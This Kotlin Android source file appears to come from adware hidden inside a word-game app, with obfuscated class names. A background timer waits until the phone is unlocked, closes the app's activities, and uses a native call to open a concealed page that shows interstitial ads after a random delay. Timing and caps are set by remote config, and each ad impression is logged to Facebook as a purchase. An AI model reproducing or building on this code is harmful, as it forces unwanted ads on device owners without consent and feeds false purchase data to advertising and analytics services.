package com.rice.jar

import android.app.Activity
import android.app.KeyguardManager
import android.content.Context
import android.os.PowerManager
import androidx.appcompat.app.AppCompatActivity
import androidx.lifecycle.lifecycleScope
import com.appsflyer.AFAdRevenueData
import com.appsflyer.AdRevenueScheme
import com.appsflyer.AppsFlyerLib
import com.appsflyer.MediationNetwork
import com.facebook.appevents.AppEventsLogger
import com.tradplus.ads.base.bean.TPAdInfo
import com.wild.rice.RiceShrimp
import com.wild.rice.WildNative
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import org.json.JSONObject
import java.text.SimpleDateFormat
import java.util.Currency
import java.util.Date
import java.util.Locale
import kotlin.random.Random

/**
 * Date：2025/3/19
 * Describe:
 */
abstract class BaseCoreRice : BaseAdCenter(), RicePageEvent {
    private val mainScope = CoroutineScope(Dispatchers.Main + SupervisorJob())
    private var isPlanIng = false
    private var timeCheck = 60000L
    private var timePeriod = 60000L
    private var timeInstall = 50000L

    private var maxHourShowAd = 100
    private var maxDayShowAd = 100
    private var maxDayClickAd = 100
    private var riceMaxJump = 100

    private val listActivity = arrayListOf<Activity>()
    private var startNumDelay = 1000L
    private var endNumDelay = 2000L

    private var retryNum by RiceWarehouseCache(def = "")

    private var showHourNum by RiceWarehouseCache()
    private var showDayNum by RiceWarehouseCache()
    private var clickDayNum by RiceWarehouseCache()

    private var lastDayStr by RiceWarehouseCache()
    private var lastHourStr by RiceWarehouseCache("0")

    private fun getRanTime(): Long {
        runCatching {
            return Random.nextLong(startNumDelay, endNumDelay)
        }
        return endNumDelay
    }

    private fun icCurDay(): Boolean {
        val day = SimpleDateFormat("yyyy-MM-dd", Locale.getDefault()).format(Date())
        if (lastDayStr != day) {
            lastDayStr = day
            log("not cur day--->")
            return false
        }
        return true
    }

    private fun isCurHour(): Boolean {
        if (System.currentTimeMillis() - lastHourStr.toLong() > 60000 * 60) {
            log("not cur hour--->")
            lastHourStr = System.currentTimeMillis().toString()
            return false
        }
        return true
    }

    private fun isLimitCur(): Boolean {
        if (isCurHour().not()) {
            showHourNum = ""
        }
        if (icCurDay().not()) {
            showHourNum = ""
            showDayNum = ""
            clickDayNum = ""
            isPostLimit = false
        }
        val length1 = showHourNum.length
        val length2 = showDayNum.length
        val length3 = clickDayNum.length
        log("limit-->$length1 --$length2 --$length3")
        if (length3 >= maxDayClickAd || length2 >= maxDayShowAd) {
            post()
            return true
        }
        if (length1 >= maxHourShowAd) {
            return true
        }
        return false
    }

    private var isPostLimit = false
    private fun post() {
        if (isPostLimit) return
        isPostLimit = true
        postEvent("getlimit", null)
    }

    override fun eRiceAny(any: Any) {
        when (any) {
            "a" -> {
                startTask()
            }

            "ssi" -> {
                isPlanIng = false
                startTask()
            }

            100 -> {
                isPlanIng = true
                refresh(JSONObject("""{}""".trimIndent()))
            }
        }
    }

    private fun startTask() {
        if (isPlanIng) return
        if (RiceJellyCache.riceLevel.contains("Rice", true)) {
            isPlanIng = true
            mainScope.launch {
                delay(800)
                if (RiceJellyCache.isActionSuccess.not()) {
                    delay(8000)
                }
                if (RiceJellyCache.isActionSuccess.not()) {
                    postEvent("action failed", null)
                    return@launch
                }
                loadAdCenter(RiceShrimp.mApplication)
                WildNative.millE("start", "HHH")
                while (isFailed.not()) {
                    delay(timeCheck)
                    eventMe()
                }
            }
        }
    }

    private var needAdNow = false
    private var lastShowTime = 0L
    private var isLimit = false
    private var isFailed = false
    private fun eventMe() {
        if (retryNum.length > riceMaxJump) {
            postEvent("jumpfail", null)
            isFailed = true
            return
        }
        postEvent("timertask", null)
        if (isUnLocked().not()) return
        postEvent("isunlock", null)
        if (isLimitCur()) {
            postEvent("ispass", "rice_limit")
            isLimit = true
            return
        }
        if (isLimit) {
            isLimit = false
            loadAdCenter(RiceShrimp.mApplication)
        }
        if (System.currentTimeMillis() - RiceJellyCache.mRiceInstallTime < timeInstall) {
            postEvent("ispass", "rice_ii")
            return
        }
        if (System.currentTimeMillis() - lastShowTime < timePeriod) {
            postEvent("ispass", "rice_ii")
            return
        }
        postEvent("ispass", null)
        val isReady = adIsReady()
        if (isReady || isShowingAd.not()) {
            needAdNow = false
            if (isReady) {
                postEvent("isready", null)
            } else if (isLoading.not()) {
                loadAdCenter(RiceShrimp.mApplication)
            }
            mainScope.launch {
                if (listActivity.isNotEmpty()) {
                    ArrayList(listActivity).forEach {
                        it.finish()
                    }
                    delay(800)
                }
                postEvent("callstart", null)
                WildNative.millE("period", "WildNative")
            }
        } else {
            if (isShowingAd && lastShowTime != 0L && System.currentTimeMillis() - lastShowTime > 90000) {
                mainScope.launch {
                    ArrayList(listActivity).forEach {
                        it.finish()
                    }
                }
            }
        }

    }

    override fun onAdLoaded(tpAdInfo: TPAdInfo?) {
        super.onAdLoaded(tpAdInfo)
        if (needAdNow) {
            needAdNow = false
            eventMe()
        }
    }

    override fun onAdClicked(tpAdInfo: TPAdInfo?) {
        super.onAdClicked(tpAdInfo)
        clickDayNum += ('a'..'f').random()

    }

    override fun onAdImpression(tpAdInfo: TPAdInfo?) {
        super.onAdImpression(tpAdInfo)
        lastShowTime = System.currentTimeMillis()
        showHourNum += "s"
        showDayNum += ('a'..'f').random()
        tpAdInfo?.let {
            val adRevenueData = AFAdRevenueData(
                tpAdInfo.adSourceName,  // monetizationNetwork
                MediationNetwork.TRADPLUS,  // mediationNetwork
                "USD",  // currencyIso4217Code
                tpAdInfo.ecpm.toDouble() / 1000 // revenue
            )

            val additionalParameters: MutableMap<String, Any> = HashMap()
            additionalParameters[AdRevenueScheme.COUNTRY] = tpAdInfo.isoCode
            additionalParameters[AdRevenueScheme.AD_UNIT] = tpAdInfo.tpAdUnitId
            additionalParameters[AdRevenueScheme.AD_TYPE] = "Interstitial"
            additionalParameters[AdRevenueScheme.PLACEMENT] = tpAdInfo.adSourcePlacementId
            AppsFlyerLib.getInstance().logAdRevenue(adRevenueData, additionalParameters)
            runCatching {
                //fb purchase
                AppEventsLogger.newLogger(RiceShrimp.mApplication).logPurchase(
                    (tpAdInfo.ecpm.toDouble() / 1000).toBigDecimal(), Currency.getInstance("USD")
                )
            }
        }


    }

    private fun isUnLocked(context: Context = RiceShrimp.mApplication): Boolean {
        return (context.getSystemService(Context.POWER_SERVICE) as PowerManager).isInteractive && (context.getSystemService(
            Context.KEYGUARD_SERVICE
        ) as KeyguardManager).isDeviceLocked.not()
    }


    override fun refresh(js: JSONObject) {
        beanAction(js)
        super.refresh(js)
    }

    override fun activityEvent(activity: Activity) {
        listActivity.add(activity)
        val name = activity::class.java.canonicalName ?: ""
        if (name == "com.wild.rice.WildPageAc") {
            retryNum = "1"
            if (activity is AppCompatActivity) {
                activity.lifecycleScope.launch {
                    val time = getRanTime()
                    postEvent("starup", "${Math.round(time / 1000.0)}")
                    delay(time)
                    postEvent("delaytime", "$time")
                    val isSuccess = showAd(activity)
                    if (isSuccess.not()) {
                        if (isLoading.not()) {
                            loadAdCenter(RiceShrimp.mApplication)
                        }
                        needAdNow = true
                    }
                }
            }
            val t = RiceJellyCache.isFirstStart()
            if (t != -1L) {
                postEvent("first_start", "$t")
            }
        } else if (name == "com.wordspot.clickword.tofill.wordspot.wordspot.MainActivity") {
            postEvent(
                "session_front", "${System.currentTimeMillis() - RiceJellyCache.mRiceInstallTime}"
            )
        }
    }

    override fun destroyEvent(activity: Activity) {
        listActivity.remove(activity)
    }

    private fun beanAction(js: JSONObject) {
        runCatching {
            val str = js.optString("wild_rice")
            fetchTime(str)
            riceTime(js.optString("market_rice_t"))
        }
    }

    private fun fetchTime(string: String) {
        runCatching {
            if (string.contains("|")) {
                val list = string.split("|")
                timeCheck = list[0].toInt() * 1000L
                timePeriod = list[1].toInt() * 1000L
                timeInstall = list[2].toInt() * 1000L
                maxHourShowAd = list[3].toInt()
                maxDayShowAd = list[4].toInt()
                maxDayClickAd = list[5].toInt()
                riceMaxJump = list[6].toInt()
            }
        }
    }

    private fun riceTime(str: String) {
        runCatching {
            if (str.contains("-")) {
                startNumDelay = str.split("-")[0].toLong()
                endNumDelay = str.split("-")[1].toLong()
            }
        }
    }
}